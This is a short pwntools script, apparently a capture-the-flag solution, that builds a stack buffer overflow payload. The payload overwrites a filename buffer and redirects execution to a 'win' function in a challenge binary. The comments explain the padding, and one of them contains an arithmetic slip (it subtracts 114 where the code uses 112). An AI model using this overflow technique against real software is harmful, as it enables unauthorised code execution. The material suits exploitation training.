#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("pwn-pas-ouf")

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    if args.REMOTE:
        return remote("address", 12345)
    else:
        return process(elf.path)


io = start()

# Notice the b" which means it is bytes.
# It has to be when concatenating with p64() which is also bytes
readme = b"readme.md" # 9 characters = 9 bytes 

# Fill the first buffer (vulnbuf) with A's
offset1 = b"A"*128

# 128 - 9 (readme.md) = 119. Since p64(0) is 8 bytes 119/8 = 14.875
# This does not add up evenly so we have to say 112/8 = 14
# and then add the last 119 - 114 = 7 bytes to fill the flagbuf completely
offset2 = p64(0)*14 + b"\x00"*7

# Now we need to fill the rest of the space - the 3 undefined variables.
# They are 8 bytes each which is 24.
# You can also calculate this 280 - 2*128 = 24
offset3 = p64(0)*3

# Win() can also be found using the command: objdump -d pas-ouf | grep win
# 0x4011a0

payload = offset1 + readme + offset2 + offset3 + p64(elf.sym['win'])

io.recvuntil(b"Hello World!")
io.sendline(payload)

io.interactive()
